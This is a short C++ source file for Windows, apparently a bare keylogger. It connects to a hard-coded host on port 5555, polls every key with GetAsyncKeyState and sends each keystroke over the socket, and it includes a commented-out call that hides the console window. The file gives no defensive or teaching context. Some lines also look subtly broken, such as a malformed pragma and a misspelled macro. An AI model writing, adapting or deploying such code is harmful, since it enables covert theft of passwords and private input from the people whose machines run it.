#define _WINSOCK_DEPRICATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define WINSOCKAPI

#pragma comment(lib."ws2_32.lib")

using namespace std;

#include<iostream>
#include<dirent.h>
#include<stdio.h>
#include<string>
#include<winsock2.h> //V2
#include<stdlib.h>
#include<windows.h>
#include<winuser.h>

int main()
{

	//ShowWindow(GetConsoleWindow(),0);
	WSADATA WSAData;
	SOCKET server;
	SOCKADDR_IN addr;

	WSAStartup(MAKEWORD(2,2),&WSAData);
	server = socket(AF_INET,SOCK_STREAM,0);
 	
 	addr.sin_family=AF_INET;
 	addr.sin_port=htons(5555);
 	addr.sin_addr.s_addr=inet_addr("192.168.1.215");
 	connect(server,(SOCKADDR *)&addr,sizeof(addr));


 	while(true)
 	{
 		Sleep(10);
 		for (int KEY=0x8;KEY<=0xFF;KEY++)
 		{
 			if(GetAsyncKeyState(KEY) == -32767 )
 			{
 				char buf[2];
 				
 				buf[0]=KEY;
 				
 				send(server,buf,sizeof(buf),0);
 			}
 		}
 	}

 closesocket(server);
 WSACleanup();









	return 0;
}

